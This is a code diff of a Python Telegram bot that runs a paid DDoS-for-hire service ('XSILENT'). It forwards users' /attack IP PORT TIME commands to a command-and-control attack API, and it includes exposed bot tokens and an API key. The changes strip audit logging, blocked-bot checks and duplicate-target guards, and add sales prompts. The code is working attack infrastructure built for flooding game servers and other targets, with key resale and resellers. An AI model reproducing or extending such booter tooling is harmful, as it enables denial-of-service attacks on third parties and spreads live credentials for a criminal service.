@@ -12,7 +12,7 @@ from datetime import datetime, timedelta
 from collections import defaultdict
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8291785662:AAECSistJLsX0E9ZjY7ki6U-fHX-4GQEHpw"
+BOT_TOKEN = "8291785662:AAEJ37JFtLjjwEQ_uoLVduw0oBdtapzXEhw"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "PFC10J"
@@ -27,7 +27,6 @@ GROUPS_FILE = os.path.join(DATA_DIR, "groups.json")
 HOSTED_BOTS_FILE = os.path.join(DATA_DIR, "hosted_bots.json")
 SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
 BROADCAST_FILE = os.path.join(DATA_DIR, "broadcast_users.json")
-LOGS_FILE = os.path.join(DATA_DIR, "logs.json")
 
 # ========== CREATE DATA DIRECTORY ==========
 if not os.path.exists(DATA_DIR):
@@ -112,32 +111,6 @@ def load_broadcast_users():
 def save_broadcast_users(data):
     with open(BROADCAST_FILE, 'w') as f:
         json.dump(data, f, indent=4)
-
-def load_logs():
-    try:
-        with open(LOGS_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        data = {"logs": []}
-        save_logs(data)
-        return data
-
-def save_logs(data):
-    with open(LOGS_FILE, 'w') as f:
-        json.dump(data, f, indent=4)
-
-def add_log(action, user_id, details=""):
-    logs = load_logs()
-    logs["logs"].append({
-        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        "action": action,
-        "user_id": user_id,
-        "details": details
-    })
-    # Keep only last 1000 logs
-    if len(logs["logs"]) > 1000:
-        logs["logs"] = logs["logs"][-1000:]
-    save_logs(logs)
 
 # ========== LOAD DATA ==========
 users_data = load_users()
@@ -246,7 +219,6 @@ def remove_user_from_system(user_id):
     if user_id in cooldown:
         del cooldown[user_id]
     
-    add_log("USER_REMOVED", user_id, f"Removed from system")
     return True
 
 def check_user_expiry(user_id):
@@ -267,7 +239,6 @@ def stop_hosted_bot(bot_token):
         if bot_token in hosted_bots:
             del hosted_bots[bot_token]
         save_hosted_bots(hosted_bots)
-        add_log("HOSTED_BOT_STOPPED", "SYSTEM", f"Bot token: {bot_token[:20]}...")
         return True
     except:
         return False
@@ -296,7 +267,6 @@ def cleanup_expired_keys():
                     users.remove(user_id)
                     users_data["users"] = users
                     save_users(users_data)
-                    add_log("KEY_EXPIRED", user_id, f"Key {key} expired")
                     try:
                         bot.send_message(user_id, "⚠️ YOUR ACCESS HAS EXPIRED!\n\nYour key has expired.\nContact admin to get a new key.")
                     except:
@@ -310,103 +280,39 @@ def cleanup_expired_keys():
 cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
 cleanup_thread.start()
 
-# ========== LOGS COMMAND ==========
-@bot.message_handler(commands=['logs'])
-def show_logs(msg):
-    uid = str(msg.chat.id)
-    
-    if uid not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    logs = load_logs()
-    if not logs["logs"]:
-        bot.reply_to(msg, "📋 No logs found!")
-        return
-    
-    # Show last 20 logs
-    recent_logs = logs["logs"][-20:]
-    log_text = "📋 **SYSTEM LOGS** (Last 20)\n\n"
-    for log in recent_logs:
-        log_text += f"🕐 `{log['timestamp']}`\n"
-        log_text += f"📌 {log['action']}\n"
-        log_text += f"👤 User: `{log['user_id']}`\n"
-        if log['details']:
-            log_text += f"📝 {log['details']}\n"
-        log_text += "\n"
-    
-    bot.reply_to(msg, log_text, parse_mode='Markdown')
-
-# ========== ADD LOGS (Auto add members) ==========
-def auto_add_to_logs(user_id, username=None, first_name=None):
-    logs = load_logs()
-    # Check if user already exists in logs
-    user_exists = False
-    for log in logs["logs"]:
-        if log["action"] == "USER_JOINED" and log["user_id"] == user_id:
-            user_exists = True
-            break
-    
-    if not user_exists:
-        add_log("USER_JOINED", user_id, f"Username: {username}, Name: {first_name}")
-
 # ========== HOST BOT FUNCTION ==========
 def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
     try:
         print(f"🔄 Starting hosted bot...")
         
+        # Clean up existing instance
         if bot_token in hosted_bot_instances:
             try:
                 hosted_bot_instances[bot_token].stop_polling()
-                time.sleep(2)
+                time.sleep(1)
             except:
                 pass
             del hosted_bot_instances[bot_token]
         
-        temp_bot = telebot.TeleBot(bot_token)
-        try:
-            temp_bot.remove_webhook()
-            print("✅ Webhook removed")
-        except:
-            pass
-        
+        # Test token and remove webhook
+        test_bot = telebot.TeleBot(bot_token)
+        test_bot.remove_webhook()
         time.sleep(2)
-        bot_info = temp_bot.get_me()
+        
+        # Verify token
+        bot_info = test_bot.get_me()
         print(f"✅ Hosted bot @{bot_info.username} is valid")
         
         hosted_bot = telebot.TeleBot(bot_token)
         hosted_bot_instances[bot_token] = hosted_bot
         hosted_cooldown_data = {}
         
-        def is_bot_blocked():
-            if bot_token in hosted_bots and hosted_bots[bot_token].get("blocked", False):
-                return True
-            return False
-        
-        def blocked_reply(chat_id):
-            try:
-                hosted_bot.send_message(chat_id, "🚫 bot is blocked 🚫\n\nContact admin for assistance.")
-            except:
-                pass
-        
-        @hosted_bot.message_handler(func=lambda m: True)
-        def check_blocked_all(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
-        
         @hosted_bot.message_handler(commands=['start'])
         def hosted_start(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
-            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/addreseller USER_ID\n/removereseller USER_ID\n/genkey 1 or 5h\n/addgroup GROUP_ID TIME\n/mykeys\n/redeem KEY\n/help")
+            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/genkey 1 or 5h\n/addgroup GROUP_ID TIME\n/mykeys\n/redeem KEY\n/help")
         
         @hosted_bot.message_handler(commands=['cooldown'])
         def hosted_cooldown(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             if uid in hosted_cooldown_data:
                 remaining = hosted_cooldown_data[uid] - time.time()
@@ -420,9 +326,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['addgroup'])
         def hosted_add_group(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             if uid != owner_id:
                 hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
@@ -446,9 +349,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['removegroup'])
         def hosted_remove_group(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             if uid != owner_id:
                 hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
@@ -467,9 +367,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['attack'])
         def hosted_attack(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             
             if uid not in users:
@@ -507,12 +404,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             attack_id = f"hosted_{bot_token}_{uid}_{int(now)}"
             target_key = f"{ip}:{port}"
             finish_time = now + duration
-            
-            for aid, ainfo in active_attacks.items():
-                if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
-                    remaining = int(ainfo["finish_time"] - now)
-                    hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {target_key}\n👤 By: {ainfo['user']}\n⏰ Finishes in: {remaining}s")
-                    return
             
             hosted_cooldown_data[uid] = now + COOLDOWN_TIME
             
@@ -552,9 +443,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['status'])
         def hosted_status(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             now = time.time()
             active_list = []
             
@@ -573,9 +461,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['addreseller'])
         def hosted_add_reseller(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             if uid != owner_id:
                 hosted_bot.reply_to(msg, "❌ Only bot owner can add resellers!")
@@ -590,15 +475,11 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 users_data["resellers"] = resellers
                 save_users(users_data)
                 hosted_bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 User: {new_reseller}\n🔑 Can now generate keys")
-                add_log("RESELLER_ADDED", new_reseller, f"Added by {uid}")
             else:
                 hosted_bot.reply_to(msg, "❌ User is already a reseller!")
         
         @hosted_bot.message_handler(commands=['removereseller'])
         def hosted_remove_reseller(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             if uid != owner_id:
                 hosted_bot.reply_to(msg, "❌ Only bot owner can remove resellers!")
@@ -613,15 +494,11 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 users_data["resellers"] = resellers
                 save_users(users_data)
                 hosted_bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 User: {target}")
-                add_log("RESELLER_REMOVED", target, f"Removed by {uid}")
             else:
                 hosted_bot.reply_to(msg, "❌ User is not a reseller!")
         
         @hosted_bot.message_handler(commands=['genkey'])
         def hosted_genkey(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             is_reseller = uid in resellers
             if uid != owner_id and not is_reseller:
@@ -642,13 +519,9 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             save_keys(keys_data)
             expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
             hosted_bot.reply_to(msg, f"✅ KEY GENERATED!\n\n🔑 Key: `{key}`\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}\n\nUser: /redeem {key}")
-            add_log("KEY_GENERATED", uid, f"Key: {key}, Duration: {format_duration(value, unit)}")
         
         @hosted_bot.message_handler(commands=['mykeys'])
         def hosted_mykeys(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             if uid != owner_id:
                 hosted_bot.reply_to(msg, "❌ Only bot owner can view keys!")
@@ -665,9 +538,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['redeem'])
         def hosted_redeem(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             uid = str(msg.chat.id)
             args = msg.text.split()
             if len(args) != 2:
@@ -690,7 +560,6 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                 users.append(uid)
                 users_data["users"] = users
                 save_users(users_data)
-                add_log("USER_ADDED", uid, f"Via key redemption: {key}")
             keys_data[key]["used"] = True
             keys_data[key]["used_at"] = time.time()
             keys_data[key]["used_by"] = uid
@@ -700,26 +569,20 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['help'])
         def hosted_help(msg):
-            if is_bot_blocked():
-                blocked_reply(msg.chat.id)
-                return
             hosted_bot.reply_to(msg, f"✨ DDOS BOT HELP ✨\n\n👑 Owner: {owner_name}\n\n/attack IP PORT TIME - Launch UDP attack\n/status - Check attack slots\n/addreseller USER_ID - Add reseller (Owner only)\n/removereseller USER_ID - Remove reseller (Owner only)\n/genkey 1 or 5h - Generate key (Owner/Reseller)\n/addgroup GROUP_ID TIME - Add group (Owner only)\n/mykeys - View your keys (Owner only)\n/redeem KEY - Activate key\n/help - This menu\n/start - Bot info\n\n⚡ Concurrent Attacks: {concurrent}\n⏱️ Max Time: 300s\n⏳ Cooldown: {COOLDOWN_TIME}s")
         
         def run_hosted_bot():
             try:
-                print(f"🚀 Starting polling for hosted bot...")
                 hosted_bot.infinity_polling()
-            except Exception as e:
-                print(f"❌ Polling error: {e}")
+            except:
+                pass
         
         threading.Thread(target=run_hosted_bot, daemon=True).start()
         time.sleep(3)
-        print(f"✅ Hosted bot started successfully!")
-        add_log("HOSTED_BOT_STARTED", owner_id, f"Bot token: {bot_token[:20]}..., Name: {owner_name}")
         return True
         
     except Exception as e:
-        print(f"❌ Failed to start hosted bot: {e}")
+        print(f"Failed to start hosted bot: {e}")
         return False
 
 # ========== MAIN BOT COMMANDS ==========
@@ -728,10 +591,6 @@ def start(msg):
     uid = str(msg.chat.id)
     chat_type = msg.chat.type
     
-    # Auto add to logs
-    auto_add_to_logs(uid, msg.from_user.username, msg.from_user.first_name)
-    
-    # Auto add to broadcast users
     if uid not in broadcast_users:
         broadcast_users.append(uid)
         broadcast_data["users"] = broadcast_users
@@ -741,7 +600,6 @@ def start(msg):
         users.append(uid)
         users_data["users"] = users
         save_users(users_data)
-        add_log("USER_JOINED", uid, f"Username: {msg.from_user.username}")
     
     if check_maintenance():
         bot.reply_to(msg, maintenance_message)
@@ -793,7 +651,6 @@ def start(msg):
 /allusers
 /allgroups
 /allhosts
-/logs
 
 🛒 Buy: XSILENT""")
     
@@ -887,7 +744,6 @@ def set_cooldown(msg):
     COOLDOWN_TIME = new_cooldown
     settings["cooldown"] = new_cooldown
     save_settings(settings)
-    add_log("COOLDOWN_CHANGED", uid, f"New cooldown: {COOLDOWN_TIME}s")
     
     bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s\n💡 Applies to all users and hosted bots")
 
@@ -917,7 +773,6 @@ def set_max_concurrent(msg):
     MAX_CONCURRENT = new_max
     settings["max_concurrent"] = new_max
     save_settings(settings)
-    add_log("MAX_CONCURRENT_CHANGED", uid, f"New max: {MAX_CONCURRENT}")
     
     bot.reply_to(msg, f"✅ MAX CONCURRENT UPDATED!\n\n⚡ New Value: {MAX_CONCURRENT}\n💡 Use /status to see changes")
 
@@ -1100,7 +955,6 @@ def host_bot(msg):
     
     if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         bot.reply_to(msg, f"✅ HOSTED BOT STARTED!\n\n🔑 Token: {bot_token[:20]}...\n👑 Owner: {owner_id}\n📛 Name: {owner_name}\n⚡ Concurrent: {concurrent}\n⏳ Cooldown: {COOLDOWN_TIME}s\n\n💡 Bot is now live!")
-        add_log("HOSTED_BOT_HOSTED", uid, f"Token: {bot_token[:20]}..., Owner: {owner_id}, Name: {owner_name}")
     else:
         bot.reply_to(msg, "❌ Failed to start hosted bot! Check token and try again.")
 
@@ -1126,7 +980,6 @@ def unhost_bot(msg):
     if bot_token in hosted_bots or bot_token in hosted_bot_instances:
         stop_hosted_bot(bot_token)
         bot.reply_to(msg, f"✅ HOSTED BOT STOPPED!\n\n🔑 Token: {bot_token[:20]}...\n💡 Bot is now completely offline.")
-        add_log("HOSTED_BOT_UNHOSTED", uid, f"Token: {bot_token[:20]}...")
     else:
         bot.reply_to(msg, "❌ Hosted bot not found!")
 
@@ -1169,11 +1022,9 @@ def maintenance(msg):
     if status == "on":
         maintenance_mode = True
         bot.reply_to(msg, "🔧 MAINTENANCE MODE ENABLED 🔧\n\nBot commands are now disabled.\nUse /maintenance off to disable.")
-        add_log("MAINTENANCE_ON", uid, "Maintenance mode enabled")
     elif status == "off":
         maintenance_mode = False
         bot.reply_to(msg, "✅ MAINTENANCE MODE DISABLED ✅\n\nBot is now fully operational!")
-        add_log("MAINTENANCE_OFF", uid, "Maintenance mode disabled")
     else:
         bot.reply_to(msg, "❌ Invalid status! Use on or off")
 
@@ -1204,7 +1055,6 @@ def genkey(msg):
     keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
     save_keys(keys_data)
     bot.reply_to(msg, f"✅ KEY GENERATED!\n\n🔑 Key: `{key}`\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n\nUser: /redeem {key}")
-    add_log("KEY_GENERATED", uid, f"Key: {key}, Duration: {format_duration(value, unit)}")
 
 @bot.message_handler(commands=['removekey'])
 def remove_key(msg):
@@ -1226,7 +1076,6 @@ def remove_key(msg):
     del keys_data[key]
     save_keys(keys_data)
     bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")
-    add_log("KEY_REMOVED", uid, f"Key: {key}")
 
 @bot.message_handler(commands=['add'])
 def add_user(msg):
@@ -1252,11 +1101,6 @@ def add_user(msg):
     users_data["users"] = users
     save_users(users_data)
     bot.reply_to(msg, f"✅ USER ADDED!\n👤 User: {new_user}")
-    add_log("USER_ADDED", new_user, f"Added by {uid}")
-    try:
-        bot.send_message(new_user, "✅ You have been granted attack access!\nUse /start to see commands")
-    except:
-        pass
 
 @bot.message_handler(commands=['remove'])
 def remove_user(msg):
@@ -1282,7 +1126,6 @@ def remove_user(msg):
     users_data["users"] = users
     save_users(users_data)
     bot.reply_to(msg, f"✅ USER REMOVED!\n👤 User: {target_user}")
-    add_log("USER_REMOVED", target_user, f"Removed by {uid}")
 
 @bot.message_handler(commands=['addreseller'])
 def add_reseller(msg):
@@ -1311,7 +1154,6 @@ def add_reseller(msg):
     users_data["resellers"] = resellers
     save_users(users_data)
     bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 Reseller: {new_reseller}")
-    add_log("RESELLER_ADDED", new_reseller, f"Added by {uid}")
 
 @bot.message_handler(commands=['removereseller'])
 def remove_reseller(msg):
@@ -1330,11 +1172,10 @@ def remove_reseller(msg):
     if target not in resellers:
         bot.reply_to(msg, f"❌ User {target} is not a reseller!")
         return
-        resellers.remove(target)
+    resellers.remove(target)
     users_data["resellers"] = resellers
     save_users(users_data)
     bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 User: {target}")
-    add_log("RESELLER_REMOVED", target, f"Removed by {uid}")
 
 @bot.message_handler(commands=['addgroup'])
 def add_group(msg):
@@ -1362,7 +1203,6 @@ def add_group(msg):
     groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
     save_groups(groups)
     bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")
-    add_log("GROUP_ADDED", uid, f"Group: {group_id}, Time: {attack_time}s")
 
 @bot.message_handler(commands=['removegroup'])
 def remove_group_cmd(msg):
@@ -1382,7 +1222,6 @@ def remove_group_cmd(msg):
         del groups[group_id]
         save_groups(groups)
         bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
-        add_log("GROUP_REMOVED", uid, f"Group: {group_id}")
     else:
         bot.reply_to(msg, "❌ Group not found!")
 
@@ -1436,7 +1275,6 @@ def redeem(msg):
         users.append(uid)
         users_data["users"] = users
         save_users(users_data)
-        add_log("USER_ADDED", uid, f"Via key redemption: {key}")
     
     keys_data[key]["used"] = True
     keys_data[key]["used_at"] = time.time()
@@ -1460,16 +1298,17 @@ def mykeys(msg):
         bot.reply_to(msg, "❌ Unauthorized!")
         return
     
-    my_keys = []
+    my_generated_keys = []
     for key, info in keys_data.items():
         if info.get("generated_by") == uid and not info.get("used", False):
             expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
-            my_keys.append(f"🔑 {key}\n   ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n   📅 Expires: {expires}")
+            duration_display = format_duration(info['duration_value'], info['duration_unit'])
+            my_generated_keys.append(f"🔑 {key}\n   ⏰ {duration_display}\n   📅 Expires: {expires}")
     
-    if my_keys:
-        bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_keys))
+    if my_generated_keys:
+        bot.reply_to(msg, f"📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_generated_keys))
     else:
-        bot.reply_to(msg, "📋 No keys generated yet!")
+        bot.reply_to(msg, f"📋 No keys generated yet!\n\n🛒 Buy: XSILENT")
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(msg):
@@ -1479,12 +1318,14 @@ def broadcast(msg):
         bot.reply_to(msg, "❌ Owner only!")
         return
     
-    all_users = [u for u in broadcast_users]
+    all_broadcast_users = [u for u in broadcast_users]
     
     if msg.reply_to_message:
-        success, fail = 0, 0
+        success_count = 0
+        fail_count = 0
         caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
-        for user in all_users:
+        
+        for user in all_broadcast_users:
             try:
                 if msg.reply_to_message.photo:
                     bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=caption)
@@ -1492,26 +1333,30 @@ def broadcast(msg):
                     bot.send_video(user, msg.reply_to_message.video.file_id, caption=caption)
                 else:
                     bot.send_message(user, caption)
-                success += 1
+                success_count += 1
             except:
-                fail += 1
-        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success}\n❌ Failed: {fail}")
-        add_log("BROADCAST_SENT", uid, f"With media, Success: {success}, Failed: {fail}")
+                fail_count += 1
+        
+        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
     else:
         args = msg.text.split(maxsplit=1)
         if len(args) != 2:
-            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to photo/video")
+            bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption")
             return
+        
         message = args[1]
-        success, fail = 0, 0
-        for user in all_users:
+        
+        success_count = 0
+        fail_count = 0
+        
+        for user in all_broadcast_users:
             try:
-                bot.send_message(user, f"📢 BROADCAST\n\n{message}")
-                success += 1
+                bot.send_message(user, f"📢 BROADCAST MESSAGE 📢\n\n{message}\n\n🛒 Buy: XSILENT")
+                success_count += 1
             except:
-                fail += 1
-        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success}\n❌ Failed: {fail}")
-        add_log("BROADCAST_SENT", uid, f"Message: {message[:50]}..., Success: {success}, Failed: {fail}")
+                fail_count += 1
+        
+        bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
 
 @bot.message_handler(commands=['stopattack'])
 def stop_attack(msg):
@@ -1529,31 +1374,33 @@ def stop_attack(msg):
     target = args[1]
     
     stopped = False
-    for aid, info in list(active_attacks.items()):
+    for attack_id, info in list(active_attacks.items()):
         if info["target_key"] == target:
-            del active_attacks[aid]
+            del active_attacks[attack_id]
             stopped = True
             bot.reply_to(msg, f"✅ ATTACK STOPPED!\n🎯 Target: {target}\n👤 Attacker: {info['user']}")
-            add_log("ATTACK_STOPPED", uid, f"Target: {target}, Attacker: {info['user']}")
             try:
-                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped!")
+                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped by owner!")
             except:
                 pass
             break
     
     if not stopped:
-        bot.reply_to(msg, f"❌ No attack found on {target}")
+        bot.reply_to(msg, f"❌ No active attack found on {target}")
 
 @bot.message_handler(commands=['methods'])
 def methods(msg):
     uid = str(msg.chat.id)
+    chat_type = msg.chat.type
     
     if check_maintenance():
         bot.reply_to(msg, maintenance_message)
         return
     
-    if uid in users or uid in ADMIN_ID or uid in resellers:
-        bot.reply_to(msg, "⚡ UDP AUTO ATTACK\n\n💡 Best for gaming\n🎯 Recommended ports: 443, 8080, 14000\n\nUSAGE:\n/attack IP PORT TIME\n\nExample: /attack 1.1.1.1 443 60")
+    if chat_type == "group" or chat_type == "supergroup":
+        bot.reply_to(msg, f"⚡ UDP AUTO ATTACK\n\n💡 Best for gaming\n🎯 Recommended ports: 443, 8080\n\n📌 USAGE:\n/attack IP PORT")
+    elif uid in users or uid in ADMIN_ID or uid in resellers:
+        bot.reply_to(msg, f"⚡ UDP AUTO ATTACK\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 Recommended ports: 443, 8080, 14000\n\n📌 USAGE:\n/attack IP PORT TIME\n\n📌 Example: /attack 1.1.1.1 443 60\n\n🛒 Buy: XSILENT")
     else:
         bot.reply_to(msg, "❌ Unauthorized!")
 
@@ -1577,7 +1424,7 @@ def stats(msg):
         if remaining > 0:
             cooldown_text = f"{int(remaining)}s left"
     
-    bot.reply_to(msg, f"📊 YOUR STATS\n\n👤 ID: {uid}\n✅ Status: {status_text}\n⏳ Cooldown: {cooldown_text}")
+    bot.reply_to(msg, f"📊 YOUR STATS\n\n👤 ID: {uid}\n✅ Status: {status_text}\n⏳ Cooldown: {cooldown_text}\n\n🛒 Buy: XSILENT")
 
 @bot.message_handler(commands=['help'])
 def help_cmd(msg):
@@ -1588,70 +1435,73 @@ def help_cmd(msg):
         bot.reply_to(msg, maintenance_message)
         return
     
-    if chat_type in ["group", "supergroup"]:
-        bot.reply_to(msg, f"✨ XSILENT GROUP HELP ✨\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
+    if chat_type == "group" or chat_type == "supergroup":
+        bot.reply_to(msg, f"✨ XSILENT GROUP HELP ✨\n\n📝 COMMANDS:\n/attack IP PORT - Launch attack\n/help - This menu\n/start - Bot info")
     elif uid in ADMIN_ID:
         bot.reply_to(msg, f"""👑 XSILENT OWNER HELP 👑
 
 📝 COMMANDS:
 
-/attack IP PORT TIME
-/status
-/cooldown
-/setmax 1-100
-/setcooldown 1-300
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/setmax 1-100 - Set concurrent limit
+/setcooldown 1-300 - Set cooldown time
 
-/genkey 1 or 5h
-/removekey KEY
+/genkey 1 or 5h - Generate key
+/removekey KEY - Remove key
 
-/add USER
-/remove USER
-/addreseller USER
-/removereseller USER
+/add USER - Add user
+/remove USER - Remove user
+/addreseller USER - Add reseller
+/removereseller USER - Remove reseller
 
-/addgroup GROUP_ID TIME
-/removegroup GROUP_ID
+/addgroup GROUP_ID TIME - Add group
+/removegroup GROUP_ID - Remove group
 
-/host BOT_TOKEN USER_ID CONCURRENT NAME
-/unhost BOT_TOKEN
+/host BOT_TOKEN USER_ID CONCURRENT NAME - Host bot
+/unhost BOT_TOKEN - Remove hosted bot
 
-/maintenance on/off
-/broadcast
-/stopattack IP:PORT
-/allusers
-/allgroups
-/allhosts
-/logs
+/maintenance on/off - Maintenance mode
+/broadcast - Broadcast (text/photo/video)
+/stopattack IP:PORT - Stop attack
+/allusers - List users
+/allgroups - List groups
+/allhosts - List hosted bots
+/api_status - API status
 
 ⚡ Concurrent: {MAX_CONCURRENT}
-⏳ Cooldown: {COOLDOWN_TIME}s""")
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
     elif uid in resellers:
         bot.reply_to(msg, f"""💎 XSILENT RESELLER HELP 💎
 
 📝 COMMANDS:
 
-/attack IP PORT TIME
-/status
-/cooldown
-/genkey 1 or 5h
-/mykeys
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/genkey 1 or 5h - Generate key
+/mykeys - Your keys
 
 ⚡ Concurrent: {MAX_CONCURRENT}
-⏳ Cooldown: {COOLDOWN_TIME}s""")
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
     elif uid in users:
         bot.reply_to(msg, f"""🔥 XSILENT USER HELP 🔥
 
 📝 COMMANDS:
 
-/attack IP PORT TIME
-/status
-/cooldown
-/redeem KEY
+/attack IP PORT TIME - Launch attack
+/status - Check slots
+/cooldown - Check your cooldown
+/redeem KEY - Activate key
 
 ⚡ Concurrent: {MAX_CONCURRENT}
-⏳ Cooldown: {COOLDOWN_TIME}s""")
+⏳ Cooldown: {COOLDOWN_TIME}s
+🛒 Buy: XSILENT""")
     else:
-        bot.reply_to(msg, f"❌ Unauthorized!\n\nUse /redeem KEY to activate")
+        bot.reply_to(msg, f"❌ Unauthorized!\n\nUse /redeem KEY to activate\n\n🛒 Buy: XSILENT")
 
 @bot.message_handler(commands=['allusers'])
 def all_users(msg):
@@ -1679,8 +1529,8 @@ def api_status(msg):
     
     try:
         test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
-        status = "Online" if test_response.status_code == 200 else "Offline"
-        bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {status}\n🎯 Active Attacks: {len(active_attacks)}")
+        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
+        bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {api_status_text}\n🎯 Active Attacks: {len(active_attacks)}")
     except:
         bot.reply_to(msg, "❌ API OFFLINE")
 
@@ -1710,7 +1560,6 @@ print(f"👑 Owner: 8487946379")
 print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
 print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
 print(f"📊 Hosted Bots: {len(hosted_bots)}")
-print(f"📢 Broadcast Users: {len(broadcast_users)}")
 print("=" * 50)
 
 bot.infinity_polling()
